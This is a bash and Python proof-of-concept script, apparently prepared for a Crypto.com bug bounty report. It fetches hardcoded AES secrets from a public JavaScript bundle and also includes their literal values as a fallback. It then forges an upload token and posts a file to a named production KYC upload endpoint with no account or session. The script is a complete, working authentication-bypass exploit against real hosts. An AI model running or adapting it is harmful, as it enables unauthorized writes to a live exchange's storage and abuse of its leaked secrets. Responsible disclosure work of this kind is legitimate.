#!/bin/bash
# ============================================================
# PoC: Hardcoded AES Secrets — Forged VIP KYC Upload Token
# Program:  Crypto.com Bug Bounty (HackerOne)
# Asset:    webview.titan.crypto.com + exchange-fe.crypto.com
# Severity: Critical
# Tested:   2026-04-10 — HTTP 201, file written to Crypto.com CDN
# ============================================================

set -e

echo "============================================================"
echo " Crypto.com — VIP Upload Token Forgery PoC"
echo "============================================================"
echo ""

# ------------------------------------------------------------
# Step 0: Install pycryptodome if not present
# ------------------------------------------------------------
echo "[*] Checking for pycryptodome..."
python3 -c "import Crypto" 2>/dev/null || {
    echo "[*] Installing pycryptodome..."
    pip3 install pycryptodome --quiet
}
echo "[+] pycryptodome ready"
echo ""

# ------------------------------------------------------------
# Step 1: Confirm hardcoded secrets are live in the public bundle
# ------------------------------------------------------------
echo "[*] Step 1 — Extracting hardcoded secrets from public JS bundle..."

BUNDLE_URL="https://webview.titan.crypto.com/assets/index-CNB59Ns7.js"

SECRET_KEY=$(curl -s "$BUNDLE_URL" | grep -om1 '"iu-fbf_2502=gexeanch"' | tr -d '"')
SECRET_TOKEN=$(curl -s "$BUNDLE_URL" | grep -om1 '"4-not_hacked=kento"' | tr -d '"')

if [ -z "$SECRET_KEY" ] || [ -z "$SECRET_TOKEN" ]; then
    echo "[-] Could not extract secrets from bundle — bundle may have been updated."
    echo "    Falling back to known values from research (2026-04-10)..."
    SECRET_KEY="iu-fbf_2502=gexeanch"
    SECRET_TOKEN="4-not_hacked=kento"
else
    echo "[+] VITE_UPLOAD_SECRET_KEY   = \"$SECRET_KEY\""
    echo "[+] VITE_UPLOAD_SECRET_TOKEN = \"$SECRET_TOKEN\""
fi
echo ""

# ------------------------------------------------------------
# Step 2: Forge a valid AES upload token (replicates CryptoJS.AES.encrypt)
# ------------------------------------------------------------
echo "[*] Step 2 — Forging AES upload token..."

TOKEN=$(python3 - << PYEOF
import os, base64, hashlib, json, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def evp_bytes_to_key(password, salt):
    password = password.encode()
    d, prev = b'', b''
    while len(d) < 48:
        prev = hashlib.md5(prev + password + salt).digest()
        d += prev
    return d[:32], d[32:48]

salt      = os.urandom(8)
key, iv   = evp_bytes_to_key("$SECRET_KEY", salt)
cipher    = AES.new(key, AES.MODE_CBC, iv)
plaintext = json.dumps({"timestamp": int(time.time() * 1000), "token": "$SECRET_TOKEN"}).encode()
ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
print(base64.b64encode(b"Salted__" + salt + ciphertext).decode())
PYEOF
)

echo "[+] Forged token: $TOKEN"
echo ""

# ------------------------------------------------------------
# Step 3: Create a minimal valid 1x1 PNG (no external tools needed)
# ------------------------------------------------------------
echo "[*] Step 3 — Generating minimal valid PNG..."

python3 << 'PNGEOF'
import struct, zlib

def chunk(name, data):
    c = name + data
    return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

sig  = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
idat = chunk(b'IDAT', zlib.compress(b'\x00\xff\x00\x00'))
iend = chunk(b'IEND', b'')

with open('/tmp/bb_poc.png', 'wb') as f:
    f.write(sig + ihdr + idat + iend)

print("[+] PNG written to /tmp/bb_poc.png (" + str(len(sig+ihdr+idat+iend)) + " bytes)")
PNGEOF

echo ""

# ------------------------------------------------------------
# Step 4: Upload using forged token — no account, no session
# ------------------------------------------------------------
echo "[*] Step 4 — Uploading to VIP KYC endpoint with forged token..."
echo "    POST https://exchange-fe.crypto.com/v1/files/vip-form-upload-files"
echo ""

RESPONSE=$(curl -sk -w "\n%{http_code}" \
  -X POST "https://exchange-fe.crypto.com/v1/files/vip-form-upload-files" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/123.0.0.0 Safari/537.36" \
  -H "Origin: https://webview.titan.crypto.com" \
  -H "Referer: https://webview.titan.crypto.com/" \
  -F "token=${TOKEN}" \
  -F "files=@/tmp/bb_poc.png;type=image/png;filename=bb_poc.png")

HTTP_BODY=$(echo "$RESPONSE" | head -n1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

echo "[+] HTTP Status : $HTTP_CODE"
echo "[+] Response    : $HTTP_BODY"
echo ""

# ------------------------------------------------------------
# Step 5: Parse and display result
# ------------------------------------------------------------
if echo "$HTTP_BODY" | grep -q '"success":true'; then
    FILE_URL=$(echo "$HTTP_BODY" | grep -o '"fileUrl":"[^"]*"' | cut -d'"' -f4)
    echo "============================================================"
    echo " [CONFIRMED] UNAUTHORIZED FILE UPLOAD SUCCESSFUL"
    echo "============================================================"
    echo " File written to Crypto.com CDN:"
    echo " $FILE_URL"
    echo ""
    echo " No account. No session. No credentials."
    echo "============================================================"
elif [ "$HTTP_CODE" = "400" ]; then
    echo "[~] Token was accepted but file was rejected (type/size check)."
    echo "    This still confirms authentication bypass — token is valid."
else
    echo "[-] Unexpected response. Secrets may have been rotated."
    echo "    Check bundle URL: $BUNDLE_URL"
fi
